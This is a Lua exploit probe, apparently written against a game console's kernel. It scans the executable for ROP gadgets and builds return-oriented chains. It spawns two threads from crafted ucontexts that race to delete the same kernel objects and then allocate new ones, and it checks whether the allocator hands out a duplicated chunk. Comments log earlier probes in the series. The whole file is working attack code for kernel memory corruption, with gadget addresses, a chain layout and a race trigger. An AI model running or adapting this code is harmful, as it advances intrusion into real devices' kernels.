-- CRASH_CLASS: HIGH
-- PROBE 792c: do the racing children's frees leave a duplicate chunk?
--
-- Context: 791d-791f made two children delete the same 48 last items (path A)
-- and got two zero statuses on ~40 of them, with no allocator effect in the
-- parent afterwards. The parent's creates may simply allocate from a
-- different CPU cache than the one the children freed into, so that test was
-- blind.
--
-- 792b proved a child can issue a create (669) directly from its ucontext:
-- RCX at ctx+0x060 and R8 at ctx+0x068 both take effect. So each racing child
-- now frees the 48 sets and then immediately allocates 8 fresh count=1 blocks
-- on the same CPU. A duplicate chunk in that CPU's free list makes two of the
-- new blocks share an entry, and a shared entry is visible from outside: the
-- second create overwrites [T+8] (id) and [T+0x28] (P), so one of the two ids
-- fails its first lookup when deleted, or disappears from the poll.
--
-- Detector: every id the children create must poll 3 and delete with status 0.
-- A freshly created id that returns 0x80020003 is a shared entry.

print("=== PROBE 792c: post-race allocation inside the racing children ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE = 3, 4
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local function hex(b) return string.char(b) end
local pop_rax = find_pat(ebase, 0x494000, hex(0x58)..hex(0xC3))
local pop_rdi = find_pat(ebase, 0x494000, hex(0x5F)..hex(0xC3))
local pop_rsi = find_pat(ebase, 0x494000, hex(0x5E)..hex(0xC3))
local pop_rdx = find_pat(ebase, 0x494000, hex(0x5A)..hex(0xC3))
local pop_rcx = find_pat(ebase, 0x494000, hex(0x59)..hex(0xC3))
local jmp_g   = find_pat(ebase, 0x494000, hex(0xEB)..hex(0xFE))
local mov_r8_rdx = find_pat(ebase, 0x494000, hex(0x49)..hex(0x89)..hex(0xD0)..hex(0xC3))
local mov_r8_rax = find_pat(ebase, 0x494000, hex(0x49)..hex(0x89)..hex(0xC0)..hex(0xC3))
print(string.format("[0] eboot=%X gadgets rax=%s rdi=%s rsi=%s rdx=%s rcx=%s jmp=%s",
    ebase, tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi),
    tostring(pop_rdx), tostring(pop_rcx), tostring(jmp_g)))
print(string.format("[0] r8 setters: mov r8,rdx=%s mov r8,rax=%s", tostring(mov_r8_rdx), tostring(mov_r8_rax)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rcx and jmp_g) then
    print("[0] core gadgets missing"); return
end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(135)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    if not (ok and to_num(rv) == 0) then return nil, nil end
    return rd(fds), rd(fds+4)
end
local one = mmap(page); wb(one, 0x41)
local data = mmap(page); wd(data+0x20, 0x2A)

local M = 48
local K = 8   -- creates per child after the delete
local function build()
    local first, last = {}, {}
    local made = 0
    for k=1,M do
        local o = mmap(page)
        local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(2), uint64(1), uint64(o)) end)
        if okc and to_num(rvc) == 0 then
            local b = rd(o) or 0
            made = made + 1
            first[made] = b
            last[made]  = b + 0x10000
        end
    end
    return first, last, made
end
local function walk(first, last, made)
    local allids = mmap(page)
    for k=1,made do
        wd(allids + (k-1)*4, first[k])
        wd(allids + (made + k-1)*4, last[k])
    end
    local pp = mmap(page)
    pcall(function() return mk(664)(uint64(allids), uint64(made*2), uint64(pp)) end)
    local n3 = 0
    for k=0,made*2-1 do if (rd(pp + k*4) or 0) == 3 then n3 = n3 + 1 end end
    local firsts = mmap(page)
    for k=1,made do wd(firsts + (k-1)*4, first[k]) end
    local fst = mmap(page)
    local okf, rvf = pcall(function() return mk(662)(uint64(firsts), uint64(made), uint64(fst)) end)
    local fz = 0
    for k=0,made-1 do if (rd(fst + k*4) or -1) == 0 then fz = fz + 1 end end
    local lasts = mmap(page)
    for k=1,made do wd(lasts + (k-1)*4, last[k]) end
    return n3, fz, lasts
end

local first, last, made = build()
print(string.format("[A] blocks=%d/%d first=%08X", made, M, first[1] or 0))
if made ~= M then print("=== PROBE 792c ABORT ==="); return end
local n3, fz, lasts = walk(first, last, made)
print(string.format("[B] poll3=%d/%d first-deleted=%d/%d", n3, M*2, fz, M))
if fz ~= M then print("=== PROBE 792c ABORT ==="); return end

-- Build one child: entry = 662(lasts, M, status), then K creates.
local function spawn(rid, status, outp)
    local ss = page*4
    local block = mmap(ss + 0x2000)
    local chain = block + ss
    local p = chain
    if mov_r8_rdx then
        for j=0,K-1 do
            local o = outp + j*4
            wq(p, uint64(pop_rdi)); wq(p+8,  uint64(1))
            wq(p+16, uint64(pop_rsi)); wq(p+24, uint64(data))
            wq(p+32, uint64(pop_rcx)); wq(p+40, uint64(1))
            wq(p+48, uint64(pop_rdx)); wq(p+56, uint64(o))
            wq(p+64, uint64(mov_r8_rdx))
            wq(p+72, uint64(pop_rdx)); wq(p+80, uint64(1))
            wq(p+88, uint64(pop_rax)); wq(p+96, uint64(669))
            wq(p+104, uint64(fn))
            p = p + 112
        end
    end
    wq(p, uint64(pop_rax)); wq(p+8, uint64(431))
    wq(p+16, uint64(fn));   wq(p+24, uint64(jmp_g))
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(chain))
    wq(ctx+Ctx.RDI, uint64(lasts));   wq(ctx+Ctx.RSI, uint64(M))
    wq(ctx+Ctx.RDX, uint64(status));  wq(ctx+Ctx.RCX, uint64(0))
    wq(ctx+Ctx.R8, uint64(0));        wq(ctx+Ctx.RAX, uint64(662))
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ra, wa = pairsock(); local rb, wb2 = pairsock()
if not (ra and rb) then print("[C] socketpairs failed"); return end
local sA, sB = mmap(page), mmap(page)
local oA, oB = mmap(page), mmap(page)
for i=0,M-1 do wd(sA+i*4, 0xAAAAAAAA); wd(sB+i*4, 0xBBBBBBBB) end
-- park both children on read() so they start together
local okA, tidA = spawn(ra, sA, oA)
local okB, tidB = spawn(rb, sB, oB)
print(string.format("[C] children ok=%s/%s tid=%X/%X creates-each=%d", tostring(okA), tostring(okB), tidA, tidB, K))
sleep_ms(150)
local okw1 = pcall(function() return mk(WRITE)(uint64(wa), uint64(one), uint64(1), uint64(0), uint64(0)) end)
local okw2 = pcall(function() return mk(WRITE)(uint64(wb2), uint64(one), uint64(1), uint64(0), uint64(0)) end)
print(string.format("[C] released %s/%s", tostring(okw1), tostring(okw2)))
sleep_ms(400)

local dbl, onec, nones = 0, 0, 0
for k=0,M-1 do
    local a, b = rd(sA+k*4) or 0, rd(sB+k*4) or 0
    local za = (a == 0) and 1 or 0
    local zb = (b == 0) and 1 or 0
    if za + zb == 2 then dbl = dbl + 1
    elseif za + zb == 1 then onec = onec + 1
    else nones = nones + 1 end
end
print(string.format("[D] delete status: two-zero=%d one=%d none=%d", dbl, onec, nones))

local ids = {}
for j=0,K-1 do
    local a, b = rd(oA+j*4) or 0, rd(oB+j*4) or 0
    ids[#ids+1] = a; ids[#ids+1] = b
end
local shown = {}
for i=1,math.min(#ids,8) do shown[#shown+1] = string.format("%08X", ids[i]) end
print("[E] child-created ids: " .. table.concat(shown, " "))

local idpage, pp = mmap(page), mmap(page)
local n = 0
for i=1,#ids do if ids[i] ~= 0 then wd(idpage + n*4, ids[i]); n = n + 1 end end
print(string.format("[E] non-zero ids=%d", n))
if n > 0 then
    local okp, rvp = pcall(function() return mk(664)(uint64(idpage), uint64(n), uint64(pp)) end)
    local st3 = 0
    for i=0,n-1 do if (rd(pp+i*4) or 0) == 3 then st3 = st3 + 1 end end
    print(string.format("[F] poll=%s/%s state3=%d/%d", tostring(okp), tostring(to_num(rvp)), st3, n))
    local st = mmap(page)
    local okd, rvd = pcall(function() return mk(662)(uint64(idpage), uint64(n), uint64(st)) end)
    local z, miss, other = 0, 0, 0
    for i=0,n-1 do
        local v = rd(st+i*4)
        if v == nil then other = other + 1
        elseif v == 0 then z = z + 1
        elseif v == 0x80020003 then miss = miss + 1
        else other = other + 1 end
    end
    print(string.format("[G] delete=%s/%s zero=%d miss=%d other=%d", tostring(okd), tostring(to_num(rvd)), z, miss, other))
    if miss > 0 or other > 0 then print("[G] ALIAS SUSPECT: a fresh id failed its delete") end
end
print("=== PROBE 792c DONE ===")
